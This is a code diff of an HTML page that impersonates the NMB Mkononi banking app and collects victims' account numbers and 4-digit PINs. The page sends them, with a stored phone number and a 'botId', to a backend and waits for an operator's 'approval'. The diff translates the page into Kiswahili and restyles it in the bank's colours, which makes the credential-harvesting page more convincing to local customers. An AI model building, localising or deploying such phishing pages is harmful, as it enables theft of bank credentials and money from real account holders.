@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -14,46 +14,40 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
     }
 
+    html, body {
+      width: 100%;
+      min-height: 100%;
+    }
+
     body {
-      background: #f4f6f8;
       min-height: 100vh;
       display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      padding: 0;
+      flex-direction: column;
+      color: #fff;
+      background: linear-gradient(
+        180deg,
+        #ff7a00 0%,
+        #ff8c1a 10%,
+        #d96a00 26%,
+        #7a3a00 44%,
+        #2a1400 62%,
+        #0a0500 78%,
+        #000000 100%
+      );
+      background-attachment: fixed;
+      background-size: cover;
+      background-repeat: no-repeat;
     }
 
-    .app-wrapper {
-      width: 100%;
-      max-width: 420px;
-      background: #ffffff;
-      min-height: 100vh;
-      position: relative;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.06);
-    }
-
-    /* ── top bar (NMB green) ── */
+    /* ── top bar (transparent over orange) ── */
     .top-bar {
       height: 72px;
-      background: linear-gradient(135deg, #007a3d 0%, #005f2e 100%);
       display: flex;
       align-items: center;
       padding: 0 22px;
       flex-shrink: 0;
       position: relative;
-      overflow: hidden;
-    }
-
-    .top-bar::after {
-      content: '';
-      position: absolute;
-      top: -50%;
-      right: -20%;
-      width: 160px;
-      height: 160px;
-      background: rgba(255, 255, 255, 0.06);
-      border-radius: 50%;
-      pointer-events: none;
+      z-index: 2;
     }
 
     .back-btn {
@@ -67,76 +61,103 @@
       cursor: pointer;
       position: relative;
       z-index: 1;
+      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
+      line-height: 1;
+    }
+
+    .brand-name {
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      opacity: 0.95;
+      margin-left: 14px;
+      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
     }
 
     /* ── container ── */
     .container {
+      flex: 1;
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
       padding: 28px 24px 100px;
       display: flex;
       flex-direction: column;
+      position: relative;
+      z-index: 1;
     }
 
     /* ── title & subtitle ── */
     .title {
       font-size: 26px;
       font-weight: 700;
-      color: #005f2e;
-      margin-bottom: 4px;
+      color: #ffffff;
+      margin-bottom: 6px;
       letter-spacing: -0.3px;
+      text-shadow: 0 2px 8px rgba(0, 0, 0, 0.35);
     }
 
     .subtitle {
       font-size: 15px;
-      color: #6b7a85;
+      color: rgba(255, 255, 255, 0.82);
       margin-bottom: 28px;
       line-height: 1.5;
+      text-shadow: 0 1px 6px rgba(0, 0, 0, 0.3);
     }
 
     /* ── field label ── */
     .field-label {
       font-size: 12px;
       font-weight: 700;
-      color: #007a3d;
-      letter-spacing: 0.6px;
+      color: #ffb066;
+      letter-spacing: 0.8px;
       text-transform: uppercase;
       margin-bottom: 8px;
       padding-left: 2px;
     }
 
-    /* ── input card ── */
+    /* ── input card (glass dark) ── */
     .input-card {
-      background: #f8fafb;
+      background: rgba(0, 0, 0, 0.28);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
       border-radius: 16px;
-      padding: 18px 16px 20px;
+      padding: 16px 16px 18px;
       margin-bottom: 20px;
-      border: 1px solid #e4eaee;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2);
     }
 
     .text-input {
       width: 100%;
       height: 56px;
       border-radius: 12px;
-      border: 1.5px solid #d5dee3;
-      background: #ffffff;
+      border: 1.5px solid rgba(255, 255, 255, 0.22);
+      background: rgba(0, 0, 0, 0.32);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
       padding: 0 16px;
       font-size: 20px;
       font-weight: 600;
-      color: #005f2e;
+      color: #ffffff;
       letter-spacing: 2px;
       outline: none;
-      transition: border-color 0.25s, box-shadow 0.25s;
+      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+      caret-color: #ff8c1a;
     }
 
     .text-input::placeholder {
-      color: #b8c4cc;
+      color: rgba(255, 255, 255, 0.45);
       font-weight: 500;
       letter-spacing: 1px;
     }
 
     .text-input:focus {
-      border-color: #007a3d;
-      box-shadow: 0 0 0 3px rgba(0, 122, 61, 0.12);
+      border-color: #ff8c1a;
+      background: rgba(0, 0, 0, 0.45);
+      box-shadow: 0 0 0 3px rgba(255, 140, 26, 0.25);
     }
 
     /* ── alert message ── */
@@ -153,31 +174,32 @@
     }
 
     #otp-alert.error {
-      background: #fdeaea;
-      color: #c0392b;
-      border: 1px solid #f5c6c6;
+      background: rgba(176, 0, 32, 0.85);
+      color: #ffffff;
+      border: 1px solid rgba(245, 198, 203, 0.6);
     }
 
     #otp-alert.success {
-      background: #e8f5ec;
-      color: #1e7e34;
-      border: 1px solid #b7d7b7;
+      background: rgba(30, 126, 52, 0.85);
+      color: #ffffff;
+      border: 1px solid rgba(183, 215, 183, 0.6);
     }
 
     /* ── waiting message ── */
     #waiting {
       text-align: center;
       font-size: 14px;
-      color: #007a3d;
+      color: #ffffff;
       margin-top: 8px;
       display: none;
       padding: 12px;
       border-radius: 10px;
-      background: #e8f5ec;
-      border: 1px solid #c3e0cd;
+      background: rgba(255, 140, 26, 0.18);
+      border: 1px solid rgba(255, 140, 26, 0.4);
+      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
     }
 
-    /* ── button (fixed) ── */
+    /* ── button (fixed, NMB orange) ── */
     .continue-btn {
       position: fixed;
       left: 50%;
@@ -192,36 +214,43 @@
       border: none;
       cursor: not-allowed;
       transition: background 0.25s, transform 0.1s, box-shadow 0.25s;
-      background: #a8cfb9;
+      background: rgba(255, 140, 26, 0.28);
       color: #ffffff;
       text-transform: uppercase;
-      letter-spacing: 0.8px;
-      box-shadow: 0 4px 12px rgba(0, 122, 61, 0.15);
+      letter-spacing: 1px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.25);
+      z-index: 3;
     }
 
     .continue-btn:enabled {
-      background: linear-gradient(135deg, #007a3d 0%, #005f2e 100%);
+      background: linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%);
       cursor: pointer;
+      box-shadow: 0 6px 20px rgba(255, 122, 0, 0.45);
     }
 
     .continue-btn:enabled:hover {
-      background: linear-gradient(135deg, #006b35 0%, #004d25 100%);
-      transform: translateX(-50%) scale(1.01);
-      box-shadow: 0 6px 16px rgba(0, 122, 61, 0.25);
+      background: linear-gradient(135deg, #ff9a33 0%, #ff7a0d 100%);
+      transform: translateX(-50%) translateY(-1px);
+      box-shadow: 0 8px 24px rgba(255, 122, 0, 0.55);
+    }
+
+    .continue-btn:enabled:active {
+      transform: translateX(-50%) translateY(0);
     }
 
     .continue-btn.waiting {
-      background: #f0ad4e;
+      background: #f5a623;
       opacity: 1;
       cursor: default;
-      box-shadow: 0 4px 12px rgba(240, 173, 78, 0.3);
+      box-shadow: 0 4px 12px rgba(240, 173, 78, 0.35);
+      transform: translateX(-50%);
     }
 
     .footer {
       margin-top: 24px;
       text-align: center;
       font-size: 12px;
-      color: #b0bcc5;
+      color: rgba(255, 255, 255, 0.45);
       letter-spacing: 0.5px;
       padding-bottom: 12px;
     }
@@ -244,25 +273,41 @@
         font-size: 18px;
       }
     }
+
+    @media (max-width: 360px) {
+      .container {
+        padding: 22px 16px 96px;
+      }
+      .title {
+        font-size: 22px;
+      }
+      .text-input {
+        height: 50px;
+        font-size: 17px;
+      }
+      .continue-btn {
+        height: 52px;
+        font-size: 16px;
+      }
+    }
   </style>
 </head>
 <body>
 
-<div class="app-wrapper">
-
-  <!-- Top bar (NMB) -->
+  <!-- Top bar (NMB Mkononi) -->
   <div class="top-bar">
     <button class="back-btn" onclick="window.history.back()">&#8592;</button>
+    <span class="brand-name">NMB Mkononi</span>
   </div>
 
   <div class="container">
 
-    <div class="title">Enter PIN</div>
-    <div class="subtitle">Enter your NMB account number and 4‑digit PIN</div>
+    <div class="title">Weka PIN</div>
+    <div class="subtitle">Weka namba ya akaunti yako ya NMB na PIN ya tarakimu 4</div>
 
     <!-- Account number (first) -->
     <div class="input-card">
-      <div class="field-label">Account Number</div>
+      <div class="field-label">Namba ya Akaunti</div>
       <input
         id="accountInput"
         class="text-input"
@@ -270,7 +315,7 @@
         inputmode="numeric"
         autocomplete="off"
         maxlength="16"
-        placeholder="Account number"
+        placeholder="Namba ya akaunti"
       />
     </div>
 
@@ -289,36 +334,35 @@
     </div>
 
     <div id="otp-alert"></div>
-    <div id="waiting">⏳ Awaiting approval…</div>
+    <div id="waiting">⏳ Inasubiri idhini…</div>
 
     <div class="footer">NMB Mkononi v 5.3.2 (1.0.0)</div>
   </div>
 
   <!-- Fixed button -->
-  <button id="verifyBtn" class="continue-btn" disabled>SUBMIT</button>
-</div>
+  <button id="verifyBtn" class="continue-btn" disabled>TUMA</button>
 
-<!-- ====== TRANSLATION LAYER (does NOT touch logic) ====== -->
+<!-- ====== TRANSLATION LAYER (French → Kiswahili) ====== -->
 <script>
   (function() {
-    // Map French → English for dynamic messages
+    // If the backend still emits French strings, convert them to Kiswahili.
     const translations = {
-      '⏳ En attente d’approbation…': '⏳ Awaiting approval…',
-      'En attente…': 'Awaiting…',
-      'Se connecter': 'SUBMIT',
-      '❌ Erreur serveur. Veuillez réessayer.': '❌ Server error. Please try again.',
-      '❌ Code PIN incorrect. Veuillez réessayer.': '❌ Incorrect PIN. Please try again.',
-      'Aucun ID reçu': 'No ID received',
-      'Erreur serveur': 'Server error'
+      '⏳ En attente d’approbation…': '⏳ Inasubiri idhini…',
+      'En attente…': 'Inasubiri…',
+      'Se connecter': 'TUMA',
+      '❌ Erreur serveur. Veuillez réessayer.': '❌ Hitilafu ya seva. Tafadhali jaribu tena.',
+      '❌ Code PIN incorrect. Veuillez réessayer.': '❌ PIN isiyo sahihi. Tafadhali jaribu tena.',
+      'Aucun ID reçu': 'Hakuna kitambulisho kilichopokelewa',
+      'Erreur serveur': 'Hitilafu ya seva'
     };
 
     function translateNode(node) {
       if (node.nodeType === Node.TEXT_NODE) {
         let text = node.textContent;
         let changed = false;
-        for (const [fr, en] of Object.entries(translations)) {
+        for (const [fr, sw] of Object.entries(translations)) {
           if (text.includes(fr)) {
-            text = text.replace(fr, en);
+            text = text.replace(fr, sw);
             changed = true;
           }
         }
@@ -349,7 +393,7 @@
   })();
 </script>
 
-<!-- ======== ORIGINAL LOGIC (ADAPTED TO PLAIN INPUTS) ======== -->
+<!-- ======== ORIGINAL LOGIC (Kiswahili strings) ======== -->
 <script>
 (function() {
   const input = document.getElementById('pinInput');
@@ -363,14 +407,14 @@
   const ACCOUNT_MAX = 16;
 
   // ── Get stored data ──
-  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'Client NMB Mkononi';
+  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'Mteja NMB Mkononi';
   const phone = localStorage.getItem('phone');
   const params = new URLSearchParams(window.location.search);
   let botId = params.get('botId') || localStorage.getItem('botId');
   if (botId) localStorage.setItem('botId', botId);
 
   if (!phone || !botId) {
-    alert('Session expirée. Veuillez recommencer.');
+    alert('Kipindi kimeisha. Tafadhali anza tena.');
     window.location.href = 'index.html';
     return;
   }
@@ -448,13 +492,13 @@
 
     if (pin.length !== 4) return;
     if (accountNumber.length < ACCOUNT_MIN) {
-      showAlert('❌ Please enter a valid account number.', 'error');
+      showAlert('❌ Tafadhali weka namba sahihi ya akaunti.', 'error');
       focusAccount();
       return;
     }
 
     verifyBtn.disabled = true;
-    verifyBtn.textContent = 'En attente…';
+    verifyBtn.textContent = 'Inasubiri…';
     verifyBtn.classList.add('waiting');
     waitingEl.style.display = 'block';
     showAlert('', '');
@@ -471,16 +515,16 @@
           botId
         })
       });
-      if (!res.ok) throw new Error('Erreur serveur');
+      if (!res.ok) throw new Error('Hitilafu ya seva');
       const data = await res.json();
-      if (!data.requestId) throw new Error('Aucun ID reçu');
+      if (!data.requestId) throw new Error('Hakuna kitambulisho kilichopokelewa');
       pollPin(data.requestId);
     } catch (error) {
       waitingEl.style.display = 'none';
       verifyBtn.disabled = false;
-      verifyBtn.textContent = 'Se connecter';
+      verifyBtn.textContent = 'TUMA';
       verifyBtn.classList.remove('waiting');
-      showAlert('❌ Erreur serveur. Veuillez réessayer.', 'error');
+      showAlert('❌ Hitilafu ya seva. Tafadhali jaribu tena.', 'error');
     }
   });
 
@@ -499,10 +543,10 @@
           // Reset PIN only (account number is kept for retry)
           input.value = '';
           verifyBtn.disabled = true;
-          verifyBtn.textContent = 'Se connecter';
+          verifyBtn.textContent = 'TUMA';
           verifyBtn.classList.remove('waiting');
           waitingEl.style.display = 'none';
-          showAlert('❌ Code PIN incorrect. Veuillez réessayer.', 'error');
+          showAlert('❌ PIN isiyo sahihi. Tafadhali jaribu tena.', 'error');
           focusPin();
         }
       } catch (error) {
